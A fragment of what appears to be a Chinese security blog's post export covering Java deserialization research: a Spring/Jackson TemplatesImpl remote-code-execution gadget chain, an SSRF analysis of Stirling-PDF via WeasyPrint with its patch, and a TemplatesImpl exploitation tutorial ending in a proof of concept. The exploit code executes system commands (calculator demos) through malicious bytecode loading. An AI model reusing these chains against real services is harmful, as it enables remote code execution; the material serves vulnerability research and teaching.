sun.misc.Unsafe;\nimport java.lang.reflect.Method;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtMethod;\nimport org.springframework.aop.framework.AdvisedSupport;\nimport javax.xml.transform.Templates;\nimport java.lang.reflect.*;\n\n// --add-opens=java.base/sun.nio.ch=ALL-UNNAMED\n// --add-opens=java.base/java.lang=ALL-UNNAMED\n// --add-opens=java.base/java.io=ALL-UNNAMED\n// --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED\n// --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\n// --add-opens=java.base/java.lang.reflect=ALL-UNNAMED\npublic class SpringRCE {\n    public static void main(String[] args) throws Exception{\n        // 删除writeReplace保证正常反序列化\n        try {\n            ClassPool pool = ClassPool.getDefault();\n            CtClass jsonNode = pool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\n            CtMethod writeReplace = jsonNode.getDeclaredMethod(\"writeReplace\");\n            jsonNode.removeMethod(writeReplace);\n            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n            jsonNode.toClass(classLoader, null);\n        } catch (Exception e) {\n        }\n\n        // 把模块强行修改，切换成和目标类一样的 Module 对象\n        ArrayList<Class> classes = new ArrayList<>();\n        classes.add(TemplatesImpl.class);\n        classes.add(POJONode.class);\n        classes.add(EventListenerList.class);\n        classes.add(SpringRCE.class);\n        classes.add(Field.class);\n        classes.add(Method.class);\n        new SpringRCE().bypassModule(classes);\n\n        // ===== EXP 构造 =====\n        byte[] code1 = getTemplateCode();\n        byte[] code2 = ClassPool.getDefault().makeClass(\"fushuling\").toBytecode();\n\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates, \"_name\", \"xxx\");\n        setFieldValue(templates, \"_bytecodes\", new byte[][]{code1, code2});\n        setFieldValue(templates,\"_transletIndex\",0);\n\n        POJONode node = new POJONode(makeTemplatesImplAopProxy(templates));\n\n        EventListenerList eventListenerList = getEventListenerList(node);\n\n        serialize(eventListenerList, true);\n    }\n\n    public static byte[] serialize(Object obj, boolean flag) throws Exception {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(obj);\n        oos.close();\n        if (flag) System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));\n        return baos.toByteArray();\n    }\n\n    public static Object makeTemplatesImplAopProxy(TemplatesImpl templates) throws Exception {\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        advisedSupport.setTarget(templates);\n        Constructor constructor = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\").getConstructor(AdvisedSupport.class);\n        constructor.setAccessible(true);\n        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\n        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);\n        return proxy;\n    }\n    public static byte[] getTemplateCode() throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass template = pool.makeClass(\"MyTemplate\");\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        template.makeClassInitializer().insertBefore(block);\n        return template.toBytecode();\n    }\n\n    public static EventListenerList getEventListenerList(Object obj) throws Exception{\n        EventListenerList list = new EventListenerList();\n        UndoManager undomanager = new UndoManager();\n\n        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。\n        Vector vector = (Vector) getFieldValue(undomanager, \"edits\");\n        vector.add(obj);\n\n        setFieldValue(list, \"listenerList\", new Object[]{Class.class, undomanager});\n        return list;\n    }\n\n    private static Method getMethod(Class clazz, String methodName, Class[]\n            params) {\n        Method method = null;\n        while (clazz!=null){\n            try {\n                method = clazz.getDeclaredMethod(methodName,params);\n                break;\n            }catch (NoSuchMethodException e){\n                clazz = clazz.getSuperclass();\n            }\n        }\n        return method;\n    }\n    private static Unsafe getUnsafe() {\n        Unsafe unsafe = null;\n        try {\n            Field field = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            field.setAccessible(true);\n            unsafe = (Unsafe) field.get(null);\n        } catch (Exception e) {\n            throw new AssertionError(e);\n        }\n        return unsafe;\n    }\n    public void bypassModule(ArrayList<Class> classes){\n        try {\n            Unsafe unsafe = getUnsafe();\n            Class currentClass = this.getClass();\n            try {\n                Method getModuleMethod = getMethod(Class.class, \"getModule\", new\n                        Class[0]);\n                if (getModuleMethod != null) {\n                    for (Class aClass : classes) {\n                        Object targetModule = getModuleMethod.invoke(aClass, new\n                                Object[]{});\n                        unsafe.getAndSetObject(currentClass,\n                                unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")), targetModule);\n                    }\n                }\n            }catch (Exception e) {\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n    public static Object getFieldValue(Object obj, String fieldName) throws Exception {\n        Field field = null;\n        Class c = obj.getClass();\n        for (int i = 0; i < 5; i++) {\n            try {\n                field = c.getDeclaredField(fieldName);\n            } catch (NoSuchFieldException e) {\n                c = c.getSuperclass();\n            }\n        }\n        field.setAccessible(true);\n        return field.get(obj);\n    }\n    public static void setFieldValue(Object obj, String field, Object val) throws Exception {\n        Field dField = obj.getClass().getDeclaredField(field);\n        dField.setAccessible(true);\n        dField.set(obj, val);\n    }\n}\n```","tags":["Java","反序列化"],"categories":["攻击技术"]},{"title":"Stirling-PDF 服务端请求伪造漏洞(CVE-2025-55150)","url":"/2024/07/21/Stirling-PDF-服务端请求伪造漏洞-CVE-2025-55150/","content":"\n## 一、漏洞复现\n\n[Stirling-PDF](https://github.com/Stirling-Tools/Stirling-PDF) v1.0.1\n\n<img src=\"/resources/9e2ac6d6605548e28f1f32b6534dd506.png\" alt=\"658e04c706d8b9f4932e63ffc0528dc0.png\" width=\"532\" height=\"263\" class=\"jop-noMdConv\">\n\n<img src=\"/resources/ea4fed99c2d04792a0129e5f37822416.png\" alt=\"3a3736842228f731e8384ae39014f746.png\" width=\"531\" height=\"275\" class=\"jop-noMdConv\">\n\n## 二、漏洞分析\n\n该项目是Spring BOOT架构，定位到漏洞所在Controller——**ConvertHtmlToPDF**。简单看下控制器逻辑，是一个将HTML文件转换成PDF文件的接口。接受到文件名、内容等信息后，将这些参数传\\*\\*FileToPdf.convertHtmlToPdf()\\*\\*方法中。\n\n<img src=\"/resources/8766f43fed554dfc90c10e92ce539130.png\" alt=\"c9a0c12453aa4afc6e2e6223f98e3cf6.png\" width=\"476\" height=\"404\" class=\"jop-noMdConv\">\n\n跟进继续看，首先会调用**sanitizeHtmlContent**方法，最终会执行到**CustomHtmlSanitizer#sanitize**，核心是 HTML 内容的清理（Sanitize）逻辑，用于防止 XSS 等注入攻击。`<iframe>`、`<script>`等都会被默认去掉，但是`<img>`依然可用。\n\n<img src=\"/resources/1a004b479b9f435387f4c00d46f1b948.png\" alt=\"b3e9004e64fa4e46ccc2f9e658e83c25.png\" width=\"474\" height=\"387\" class=\"jop-noMdConv\">\n\n通过了清理逻辑之后，接下来就是命令执行逻辑了。Stirling-PDF是内置了[WeasyPrint](https://github.com/Kozea/WeasyPrint)插件，本质上就是通过构造Command数组，通过**ProcessBuilder.start**用插件将HTML转成PDF。\n\n<img src=\"/resources/4eaef0f51d5a4272b0a65eb56423839f.png\" alt=\"f506014895d46ee7d3357756455f4414.png\" width=\"470\" height=\"454\" class=\"jop-noMdConv\">\n\n其实看到这，就会发现本质上还是 [WeasyPrint](https://github.com/Kozea/WeasyPrint) 插件得问题，[Stirling-PDF](https://github.com/Stirling-Tools/Stirling-PDF) v1.0.1版本内置的 [WeasyPrint](https://github.com/Kozea/WeasyPrint) 插件为65.1，最新版本为66.0。\n\n那么问题只剩下一个了：[WeasyPrint](https://github.com/Kozea/WeasyPrint) 是否修复了这个问题？下图可见最新版本同样存在这个问题，在转换过程中会远程加载`<img>`中的图片链接导致SSRF。\n\nWeasyPrint 是基于 Requests + CairoSVG 的，默认会联网下载外部资源。但其所依赖的库中没有能伪造图片RCE的历史漏洞或者调用除http(s)其他协议的漏洞，所以漏洞危害程度较低。\n\n<img src=\"/resources/9acc320b2a374ad18a9d1556cde1a398.png\" alt=\"8666e409fbdc38e3d95f10d45337c1f8.png\" width=\"602\" height=\"376\" class=\"jop-noMdConv\">\n\n## 三、补丁分析\n\n[Stirling-PDF](https://github.com/Stirling-Tools/Stirling-PDF) 官方在web层面对传入的HTML文件实施了进一步[修复过滤](https://github.com/Stirling-Tools/Stirling-PDF/commit/7d6b70871bad2a3ff810825f7382c49f55293943)，用来检查一个URL是否允许访问，按照不同安全等级进行过滤。配置文件**settings.yml.template**里默认防护等级为MEDIUM，拒绝黑名单、私有IP网段、本地地址、云厂商元数据IP的访问。\n\n<img src=\"/resources/8c704a2148284c43964454b65df5f99e.png\" alt=\"4b3fd7c7cce05489d0acefa2575e09c7.png\" width=\"457\" height=\"438\" class=\"jop-noMdConv\">\n\n&nbsp;","tags":["vulnerability"],"categories":["漏洞分析"]},{"title":"TemplatesImpl利用链分析","url":"/2022/11/10/TemplatesImpl利用链分析/","content":"\n# 前言\n\n在学习`java cc2`链的时候看到利用`TemplatesImpl`，记得之前在`fastjson`反序列化的时候也遇到过，所以就想着单独写个`TemplatesImpl`利用链分析的文章。\n\n# 自定义类加载器\n\n在编写类加载器的时候需要的条件有：\n\n1.  继承`ClassLoader`类\n2.  重写`findClass`方法\n3.  在findClass方法中调用defineClass方法来定义一个类\n\n当然，上述条件中我们不是一定要重写`findClass`方法的，我们也可以重写`loadClass`，只不过这样可能会破坏“双亲委派”机制，而且通过查看`ClassLoader.findClass`方法也可以明白为什么重写`findClass`（抛出异常的空方法）\n\n<img src=\"/resources/a270005845fc44bbac368335ad542d6c.png\" alt=\"ab552a5906522a4a6238aad508d574f8.png\" width=\"856\" height=\"255\" class=\"jop-noMdConv\">\n\n在之前的文章中，我们通过文件读取`class`文件来获取字节码并进行自定义加载，但是这样操作起来难免会有些不方便，所以有没有一种方法可以直接通过`java`文件来直接获取字节码，确实可以这样，这里就需要学习一下`javasist`\n\n# javasist\n\n首先我们在`pom.xml`里边添加一下依赖：\n\n```xml\n<dependency>\n    <groupId>org.javassist</groupId>\n    <artifactId>javassist</artifactId>\n    <version>3.22.0-GA</version>\n</dependency>\n```\n\n通常我们需要将`.java`文件编译成`.class`才能正常执行，在命名行中我们通常使用`javac`来编译，`javasist`是一个处理字节码的类库，能够动态修改`class`字节码文件，也可以直接读取到一个`java`类的字节码，现在来简单学习一下它的常用用法：\n\n`Javassist`中最为重要的是`ClassPool`、`CtClass`、`CtMethod`、`CtField`以及`CtConstructor`这几类。\n\n```\nCtClass: 一个CtClass(编译时类)对象可以处理一个class文件, 这些CtClass对象可以从ClassPool获得\nClassPool: CtClass对象的容器, 其中键是类名称， 值是表示该类的CtClass对象\nCtMethods: 表示类中的方法\nCtFields: 表示类中的字段\nCtConstructor：标识类中的构造器\n```\n\n创建ClassPool对象作为CtClass的容器：\n\n```java\npublic ClassPool(boolean useDefaultPath) {}\n// ClassPool pool = new ClassPool(true);\npublic static synchronized ClassPool getDefault() {}\n// 效果与 new ClassPool(true) 一致\n// ClassPool pool = ClassPool.getDefault();\n```\n\n获取指定类名的CtClass类对象：\n\n```java\npublic CtClass getCtClass(String classname) throws NotFoundException {}\n\n```\n\n销毁ClassPool容器里的CtClass类对象：\n\n```java\npublic void detach(){}\n```\n\n创建一个CtClass类对象：\n\n```java\npublic CtClass makeClass(String classname) throws RuntimeException {}\n// CtClass test = pool.makeClass(\"Test\");\npublic CtClass makeClass(InputStream classfile) throws IOException, RuntimeException {}\n// pool.makeClass(new FileInputStream(new File(\"Test.class\")))\n\n```\n\n获取CtClass类对象:\n\n```java\npublic CtClass[] get(String[] classnames) throws NotFoundException {}\n// pool.get(TestInterface.class.getName())\n```\n\n将`ClassPath`加到类搜索路径的末尾位置 or插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类：\n\n```java\n// 起始位置插入\npool.insertClassPath(new ClassClassPath(this.getClass()));\n// 末尾位置插入\npool.appendClassPath(new ClassClassPath(this.getClass()));\n\n```\n\n设置需要继承的类：\n\n```java\npublic void setSuperclass(CtClass clazz) throws CannotCompileException {}\n// test.setSuperclass(pool.get(TestClass.class.getName()));\n\n```\n\n设置和添加需要实现的接口：\n\n```java\npublic void setInterfaces(CtClass[] list) {}\n// test.setSuperclass(pool.get(TestInterface.class.getName()));\npublic void addInterface(CtClass anInterface) {}\n// // test.addInterface((pool.get(TestInterface.class.getName()));\n```\n\n构造器相关操作：\n\n```java\n// 创建空构造器\npublic CtConstructor makeClassInitializer() throws CannotCompileException {}\n// 添加构造器\npublic void addConstructor(CtConstructor c) throws CannotCompileException {}\n// 删除构造器\npublic void removeConstructor(CtConstructor c) throws NotFoundException {}\n```\n\n将java语句插入：\n\n```java\n// 插入java语句\npublic void insertBefore(String src) throws CannotCompileException {}\n// ctConstructor.insertBefore(\"System.out.println(\\\"Hello\\\");\")\n// 设置java语句\npublic void setBody(String src) throws CannotCompileException {}\n// ctConstructor.setBody(\"System.out.println(\\\"Hello\\\");\")\n```\n\n将编译的类创建为.class文件\n\n```java\npublic void writeFile() throws NotFoundException, IOException, CannotCompileException {}\n//test.writeFile();\n```\n\n# 使用示例\n\n以上方法只是小部分，还没有涉及方法、字段及构造器等诸多操作，现在使用刚才学习的这些方法来生成一个类`.class`文件，编写代码如下：\n\n```java\npackage com.serializable.cc2;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\npublic class MakeCtClass {\n    public static void main(String[] args) throws Exception {\n        ClassPool aDefault = ClassPool.getDefault();\n        CtClass testCtClass = aDefault.makeClass(\"TestCtClass\");\n        aDefault.insertClassPath(new ClassClassPath(AbstractTranslet.class));\n        testCtClass.setSuperclass(aDefault.get(AbstractTranslet.class.getName()));\n        CtConstructor ctConstructor = testCtClass.makeClassInitializer();\n        ctConstructor.insertBefore(\"Runtime.getRuntime().exec(\\\"calc\\\");\");\n        testCtClass.writeFile();\n    }\n}\n\n```\n\n然后我们执行后将会在根目录生成`TestCtClass.class`文件\n\n[![](/resources/2524a1a35b0c4b27be8ec879b92c6eca.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233630232-1811464882.png)\n\n这里发现写进去的java语句是用`static`进行修饰的，`static`关键字在平时我们经常用于修饰变量或者方法，然后将它们叫做**静态变量**或静态方法，如果向上图所示那样，则是使用`static`关键字用于代码块，叫做**静态代码块**，当JVM加载该类时候就会执行这些静态代码块。\n\n这里我想要通过自定义类加载器去加载这个类，先编写简单的自定义类加载器`TestClassLoader`：\n\n```java\npackage com.serializable.cc2;\n\nimport java.io.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class TestClassLoader extends ClassLoader {\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        Class<?> c = findLoadedClass(name);\n        if (c == null) {\n            String path = name + \".class\";\n            byte[] classData = null;\n            try {\n                classData = Files.readAllBytes(Paths.get(path));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            c = defineClass(name, classData, 0, classData.length);\n        }\n        return c;\n    }\n}\n\n```\n\n然后使用这个加载器去加载刚刚生成的`TestCtClass.class`，编写`LoadTestClass`\n\n```java\npackage com.serializable.cc2;\n\n\nimport java.lang.reflect.Constructor;\n\npublic class LoadTestClass {\n    public static void main(String[] args) throws Exception {\n        ClassLoader classLoader = new TestClassLoader();\n        Class<?> testCtClass = classLoader.loadClass(\"TestCtClass\");\n        System.out.println(testCtClass);\n    }\n}\n\n```\n\n这里我本以为执行过后会弹出计算器，但是结果却和我想的不一样\n\n> 不是说当JVM加载一个类的时候会执行它的static静态代码块的吗？\n\n当我通过反射进行初始化该类的时候才弹出了计算器，添加了如下代码：\n\n```java\ntestCtClass.getConstructor().newInstance();\t\n```\n\n这时我突然对这个问题很好奇，也对之前学习Java类加载过程的内容标识怀疑！\n\n* * *\n\n经过向大佬请教，之前我们对类加载的理解也并没有问题，静态代码块确实是在JVM加载该类的时候执行，但是这里容易混淆，Java类加载按大了分为三个步骤：加载、链接、初始化！类加载和加载并不能混为一谈，按照之前的说法，JVM加载类包括以上的三个步骤，但是执行静态代码块的时候并不是在加载的这一个环节，而是在类加载的初始化环节！\n\n这里还学习到了一个知识点，一个类初始化的三种方法：\n\n1.  静态初始化\n2.  匿名初始化\n3.  构造方法初始化\n\n它们在类加载的过程中按照以上顺序执行，写个代码就懂了：\n\n```java\npublic class User {\n    static {\n        System.out.println(\"static\");\n    }\n    {\n        System.out.println(\"Empty\");\n    }\n    public User() {\n        System.out.println(\"User\");\n    }\n}\n\n```\n\n通过不同方式去加载上边的这个`User`类\n\n```java\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"forName方法，initialize 为false，不进行初始化:\");\n        Class.forName(\"User\", false, ClassLoader.getSystemClassLoader());\n        System.out.println(\"forName方法，进行初始化：\");\n        Class.forName(\"User\");\n        System.out.println(\"进行实例化：\");\n        new User();\n    }\n}\n\n```\n\n[![](/resources/88a3d3214eb14a30bebd500cf7121f38.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233630843-299857451.png)\n\n这里发现实例化的时候没有输出static，因为类加载的时候静态代码块只执行一次：\n\n```java\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"进行实例化：\");\n        new User();\n    }\n}\n\n```\n\n[![](/resources/ec04749b2af24bb38048a124bc2be4c2.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233631446-911626772.png)\n\n* * *\n\n继续回到刚才使用自定义加载器去加载`TestCtClass.class`，这个过程中并不包括初始化操作（也不包括链接过程，只是类加载过程中的加载步骤），所以就不会执行静态代码块\n\n[![](/resources/8be645cb96154c079fa85f33f1b3a9a4.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233632159-1310529553.png)\n\n# TemplatesImpl加载字节码\n\n说了这么多，终于切入正题了，`TemplatesImep`利用链的核心就是可以恶意加载字节码，因为该类中存在一个内部类`TransletClassLoader`，该类继承了`ClassLoader`并且重写了`loadClass`，我们可以通过这个类加载器进行加载字节码。因为是内部类，无法在外部进行调用，所以我们看一看哪个方法使用了这个类。\n\n[![](/resources/3f46f291629740b787109d8dd39630dc.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233632710-1022601410.png)\n\n查看`TransletClassLoader#defineTransletClasses`\n\n<img src=\"/resources/9abc9c7c1c4b497aabc7d328006c89cf.png\" alt=\"bf6ce6ee16b63b92ae441584f394813e.png\" width=\"1031\" height=\"349\" class=\"jop-noMdConv\">\n\n如上图所示，`_bytecodes`就是需要加载的字节码，它的类型是`byte[][]`，所以我们需要转换一下类型`new byte[][]{bytes}`\n\n<img src=\"/resources/0cad1041a8694bdc9b1201e80457a40f.png\" alt=\"bdc104cd62f05101c13850cceb23dffe.png\" width=\"420\" height=\"93\" class=\"jop-noMdConv\">\n\n`_tfactory`默认为null，如果为null的话在上图第二方框处就会报错，因为它是一个`TransformerFactoryImpl`类型的对象，所以我们只需要复制给它一个对象即可`new TransformerFactoryImpl()`\n\n<img src=\"/resources/09c3c4ed971f4a2f833790da7a070fdf.png\" alt=\"a8b7fc486a97cb4d9fc4265dc3fb9a15.png\" width=\"581\" height=\"84\" class=\"jop-noMdConv\">\n\n到这里，我们来尝试去加载一下这个类，这里可以使用`javasist`来生成`class`字节码并通过`CtClass#toBytecode`获取字节数组，也可以编写`.java`文件，进行获取，下边使用后者：\n\n编写被加载类`TestTemplatesImpl.java`：\n\n```java\npackage com.serializable.cc2;\n\n\nimport java.io.IOException;\n\npublic class TestTemplatesImpl {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    public TestTemplatesImpl() {\n    }\n}\n\n```\n\n然后通过反射赋值并执行`TemplatesImpl#defineTransletClasses`\n\n```java\npackage com.serializable.cc2;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\n\nimport java.lang.reflect.Method;\n\npublic class LoadTestTemp {\n    public static void main(String[] args) throws Exception {\n        ClassPool classPool = ClassPool.getDefault();\n        CtClass ctClass = classPool.getCtClass(\"com.serializable.cc2.TestTemplatesImpl\");\n        byte[] bytes = ctClass.toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes});\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        Method defineTransletClasses = TemplatesImpl.class.getDeclaredMethod(\"defineTransletClasses\");\n        defineTransletClasses.setAccessible(true);\n        defineTransletClasses.invoke(templates);\n    }\n}\n```\n\n通过调试发现，这个类确实已经被加载了，但是最后并没有执行静态代码（当然，因为只是加载了这个类，并没有进行初始化）\n\n所以我们继续查看一下哪里调用了`TemplatesImpl#defineTransletClasses`\n\n<img src=\"/resources/71b078ed230642d2a7358e828cbcf6a2.png\" alt=\"e8ac967488bd785cacf18b9720b36c15.png\" width=\"588\" height=\"324\" class=\"jop-noMdConv\">\n\n一共有3个地方调用了`TemplatesImpl#defineTransletClasses`，但是发现在`getTransletInstance`这里进行了实例化操作，通过这里应该可以达到实现，我们来看一下执行条件：\n\n首先`_name`不能为`null`，通过反射赋值为任意`String`类型。\n\n`_class`需要是`null`（默认为null，无需更改）\n\n<img src=\"/resources/54369d89f368453584c81fc9fb682265.png\" alt=\"891d70b1b584adf9752aabb305a465fd.png\" width=\"460\" height=\"335\" class=\"jop-noMdConv\">\n\n继续往下看，接下来的`_class`变量在`TemplatesImpl#defineTransletClasses`执行过后会被加载入类。\n\n<img src=\"/resources/f134154622fc43b6b67c79e6db51651a.png\" alt=\"efe3d55bc8320a4371c8eebccfc427b3.png\" width=\"858\" height=\"298\" class=\"jop-noMdConv\">\n\n然后`_transletIndex`变量默认为`-1`。然后在`TemplatesImpl#defineTransletClasses`中也对这个变量进行了操作。\n\n<img src=\"/resources/1771d05f8aca429aa4103086ec27f07e.png\" alt=\"714afc003f2b7bbd613758c8ef783e74.png\" width=\"735\" height=\"88\" class=\"jop-noMdConv\"> <img src=\"/resources/dcbefb30951a4725b08a62d5c514fd88.png\" alt=\"566fa3c152c6e95b620069d46bdbbffb.png\" width=\"650\" height=\"118\" class=\"jop-noMdConv\">\n\n`superClass`变量即加载入的类的父类，如果父类为`AbstractTranslet`就会给`_transletIndex`赋值（也就是载入类在`_class`的位置）。\n\n所以，我们需要在之前的`TestTemplatesImpl.java`代码修改，让其继承`AbstractTranslet`，代码如下：\n\n```java\npackage com.serializable.cc2;\n\n\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\nimport java.io.IOException;\n\npublic class TestTemplatesImpl extends AbstractTranslet {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    public TestTemplatesImpl() {\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n}\n\n```\n\n还要给`_name`赋值，并执行`TemplatesImpl#getTransletInstance`\n\n```java\npackage com.serializable.cc2;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\n\nimport java.lang.reflect.Method;\n\npublic class LoadTestTemp {\n    public static void main(String[] args) throws Exception {\n        ClassPool classPool = ClassPool.getDefault();\n        CtClass ctClass = classPool.getCtClass(\"com.serializable.cc2.TestTemplatesImpl\");\n        byte[] bytes = ctClass.toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes});\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        Reflections.setFieldValue(templates, \"_name\", \"seizer\");\n        Method defineTransletClasses = TemplatesImpl.class.getDeclaredMethod(\"getTransletInstance\");\n        defineTransletClasses.setAccessible(true);\n        defineTransletClasses.invoke(templates);\n    }\n}\n\n```\n\n执行后成功弹出计算器：\n\n<img src=\"/resources/749024596c0741c7b57781dab9ad8c95.png\" alt=\"782bd4ba6bcda0149f8a2865dae3050a.png\" width=\"891\" height=\"645\" class=\"jop-noMdConv\">\n\n之后还可以进一步改进一下代码，在`newTransformer`处调用了`getTransletInstance`\n\n<img src=\"/resources/1c0a09765d9d4ca5963e8faf06285300.png\" alt=\"131f2a45cc38eaa8a1ba2a4772410e7e.png\" width=\"723\" height=\"186\" class=\"jop-noMdConv\">\n\n并且该方法是一个`public`方法，不需要通过反射调用\n\n> 这里捎带看了下synchronized关键字，大概解释就是用于Java并发编程中保证多线程安全的，当synchronized关键字修饰一个方法的时候，该方法叫做同步方法，该方法执行完或发生异常时，会自动释放锁。\n\n所以我们可以直接调用`TemplatesImpl#newTransformer`也可以弹出计算器，进一步查找，看看还有没有其他方法。发现`getOutputProperties`方法中调用了`newTransformer`，这里应该依然可以成功弹出计算器，然后继续寻找无果，这条利用链也就到此结束了。\n\n<img src=\"/resources/20c5b4de481e4f0ca3ee5374a7df1607.png\" alt=\"5858701c679a53b30572594e5f63fb5b.png\" width=\"760\" height=\"221\" class=\"jop-noMdConv\">\n\n利用链如下：\n\n```\nTemplatesImpl#getOutputProperties->TemplatesImpl#newTransformer->TemplatesImpl#getTransletInstance->TemplatesImpl#defineTransletClasses->TransletClassLoader#defineClass\n\nTemplatesImpl#newTransformer->TemplatesImpl#getTransletInstance->TemplatesImpl#defineTransletClasses->TransletClassLoader#defineClass\n\nTemplatesImpl#getTransletInstance->TemplatesImpl#defineTransletClasses->TransletClassLoader#defineClass\n\n```\n\n# 最终POC\n\n```java\npackage com.serializable.cc2;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\n\npublic class LoadTestTemp {\n    public static void main(String[] args) throws Exception {\n        ClassPool classPool = ClassPool.getDefault();   // 获取CtClass容器\n        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 引入AbstractTranslet路径到classpath中\n        CtClass testCtClass = classPool.makeClass(\"TestCtClass\");   // 创建CtClass对象\n        testCtClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));    // 设置父类为AbstractTranslet\n        CtConstructor ctConstructor = testCtClass.makeClassInitializer();   // 创建空初始化构造器\n        ctConstructor.insertBefore(\"Runtime.getRuntime().exec(\\\"calc\\\");\"); // 插入初始化语句\n        byte[] bytes = testCtClass.toBytecode();    // 获取字节数据\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes});\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        Reflections.setFieldValue(templates, \"_name\", \"seizer\");\n//        templates.newTransformer();\n        templates.getOutputProperties();\n    }\n}\n\n```\n\n效果图如下：\n\n<img src=\"/resources/1b13968b48ff4e9ead1720ec3457a2f1.png\" alt=\"04eba7b495adebf1b81405763e96e1e9.png\" width=\"813\" height=\"523\" class=\"jop-noMdConv\">","tags":["Java","反序列化"],"categories":["攻击技术"]}]